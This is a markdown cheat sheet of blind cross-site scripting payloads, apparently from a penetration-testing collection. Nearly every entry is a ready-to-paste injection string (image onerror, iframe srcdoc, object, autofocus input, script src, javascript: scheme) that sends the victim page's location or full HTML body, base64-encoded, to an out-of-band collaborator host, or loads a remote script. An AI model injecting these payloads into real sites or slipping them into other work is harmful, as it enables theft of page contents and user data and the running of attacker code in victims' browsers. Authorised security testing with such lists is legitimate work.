Blind XSS Payloads
==================

The following list includes some blind XSS payloads that can be used to proof evaluation of JavaScript using out-of-band communication.


## Image only: HTML Injection without JavaScript
```html
'"><img src="https://example.burpcollaborator.net/image">
```

## Image-Tag XSS Payloads
```html
'"><img src="https://example.burpcollaborator.net/image-only" onerror='this.src="https://example.burpcollaborator.net/image-xss?"+btoa(document.location)'>

'"><img src=x onerror='this.src="https://example.burpcollaborator.net/image-xss?"+btoa(document.location)'>

'"><img src=x onerror='this.src="https://"+btoa(document.location)+".example.burpcollaborator.net/image-dns?"'>

'"><img src=x onerror='this.src="https://example.burpcollaborator.net/image-xss?"+btoa(document.location)'>

'"><img src=x onerror='fetch("https://example.burpcollaborator.net/image-xss-post",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})'>
```

## iFrame XSS Payloads
```html
'"><iframe src='javascript:window.location="https://example.burpcollaborator.net/iframe-src?"+btoa(parent.document.location)'></iframe>

'"><iframe srcdoc='<script>window.location="https://example.burpcollaborator.net/iframe-srcdoc?"+btoa(parent.document.location)</script>'></iframe>

'"><iframe srcdoc='<script>fetch("https://example.burpcollaborator.net/iframe-srcdoc-post",{method:"POST",body:btoa(parent.document.body.innerHTML),mode:"no-cors"})</script>'></iframe>
```

## Object XSS Payloads
```html
'"><object data='javascript:window.location="https://example.burpcollaborator.net/iframe-src?"+btoa(parent.document.location)'></object>
```

## Input field
```html
<input onfocus='fetch("https://example.burpcollaborator.net/imput-post",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})' autofocus>
```

## Script-Tag
```html
'"><script src=https://example.burpcollaborator.net/script-tag></script>

'"><script type="text/javascript" src="https://example.burpcollaborator.net/script-tag-type"></script>

'"><script type="module" src="https://example.burpcollaborator.net/script-tag-module"></script>
'"><script nomodule src="https://example.burpcollaborator.net/script-tag-nomodule"></script>
```

## JavaScript Scheme
```
javascript:window.location="https://example.burpcollaborator.net/js-scheme?"+btoa(document.location)

javascript:fetch("https://example.burpcollaborator.net/js-scheme-fetch?"+btoa(document.location))
```
